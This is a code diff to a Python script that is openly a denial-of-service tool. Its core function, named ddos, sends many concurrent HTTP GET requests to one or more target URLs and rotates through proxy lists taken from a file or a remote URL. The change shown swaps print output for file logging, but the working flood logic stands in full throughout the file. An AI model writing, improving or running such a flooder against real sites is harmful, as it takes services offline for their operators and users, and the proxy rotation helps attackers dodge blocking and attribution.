@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 import asyncio
+import logging
+import os
 import sys
 from collections import defaultdict
 from itertools import cycle
@@ -13,24 +15,31 @@ from aiohttp_socks import ProxyConnector
 STATS = defaultdict(int)
 
 
-async def make_request(url: str, proxy: str, verbose: bool, timeout: int):
+def config_logger(verbose):
+    filename = os.path.abspath(sys.argv[0]).split('.')[0] + '.log'
+    logging.basicConfig(
+        filename=filename,
+        level=logging.DEBUG if verbose else logging.INFO,
+        format="[%(asctime)s] %(levelname)s:  %(message)s",
+        datefmt="%d-%m-%Y %I:%M:%S",
+    )
+
+
+async def make_request(url: str, proxy: str, timeout: int):
     timeout = aiohttp.ClientTimeout(total=timeout)
-    if verbose:
-        print(f'Url: {url} Proxy: {proxy}')
+    logging.debug('Url: %s Proxy: %s', url, proxy)
     try:
         if proxy:
             connector = ProxyConnector.from_url(proxy)
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                async with session.get(url) as response:
-                    await response.text()
-                    print(response.status)
+            client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
         else:
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                async with session.get(url) as response:
-                    await response.text()
-                    print(response.status)
+            client_session = aiohttp.ClientSession(timeout=timeout)
+        async with client_session as session:
+            async with session.get(url) as response:
+                await response.text()
+                logging.info('Url: %s Proxy: %s Status: %s', url, proxy, response.status)
     except Exception as error:
-        print(f'Url: {url} Proxy: {proxy} Error: {error}', file=sys.stderr)
+        logging.warning('Url: %s Proxy: %s Error: %s', url, proxy, error)
         STATS[f'{type(error)}'] += 1
     else:
         STATS['success'] += 1
@@ -44,22 +53,22 @@ def get_proxy(proxy_iterator: Iterable[str]) -> str:
         return None
 
 
-async def ddos(target_url: str, timeout: int, count: int, verbose: bool, proxy_iterator: Iterable[Tuple[str, str, int]]):
+async def ddos(target_url: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]]):
     step = 0
     while True:
         if count and step > count:
             break
         step += 1
         proxy = get_proxy(proxy_iterator)
-        await make_request(target_url, proxy, verbose, timeout)
+        await make_request(target_url, proxy, timeout)
 
 
-async def amain(target_urls: List[str], timeout: int, concurrency: int, count: int, verbose: bool, proxies: List[Tuple[str, str, int]]):
+async def amain(target_urls: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]]):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
     for target_url in target_urls:
         for _ in range(concurrency):
-            coroutines.append(ddos(target_url, timeout, count, verbose, proxy_iterator))
+            coroutines.append(ddos(target_url, timeout, count, proxy_iterator))
     await asyncio.gather(*coroutines)
 
 
@@ -75,6 +84,7 @@ async def amain(target_urls: List[str], timeout: int, concurrency: int, count: i
 def main(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, verbose: bool):
+    config_logger(verbose)
     if not target_urls_file and not target_url:
         raise SystemExit('--target-url or --target-urls-file is required')
     proxies = load_proxies(proxy_file, proxy_url)
@@ -85,17 +95,19 @@ def main(
     if target_url:
         target_urls.append(target_url)
     loop = asyncio.get_event_loop()
-    loop.run_until_complete(amain(target_urls, timeout, concurrency, count, verbose, proxies))
+    loop.run_until_complete(amain(target_urls, timeout, concurrency, count, proxies))
     for key, value in STATS.items():
         if key != 'success':
-            print(f"{key}: {value}")
-    print(f'success: {STATS["success"]}')
+            logging.info("%s: %s", key, value)
+    logging.info('success: %s', STATS["success"])
 
 
 def load_proxies(proxy_file: str, proxy_url: str) -> List[Tuple[str, str, int]]:
     if proxy_url:
+        logging.info('Loading proxy list from %s..', proxy_url)
         proxy_data = requests.get(proxy_url).text
     elif proxy_file:
+        logging.info('Loading proxy list from %s..', proxy_file)
         proxy_data = open(proxy_file).read()
     else:
         proxy_data = None
@@ -106,6 +118,7 @@ def load_proxies(proxy_file: str, proxy_url: str) -> List[Tuple[str, str, int]]:
             ip = line.split(':')[0]
             port = int(line.split(':')[-1].split('#')[0])
             proxies.append((type_, ip, port))
+        logging.info('Loaded %s proxies', len(proxies))
         return proxies
     return None
 
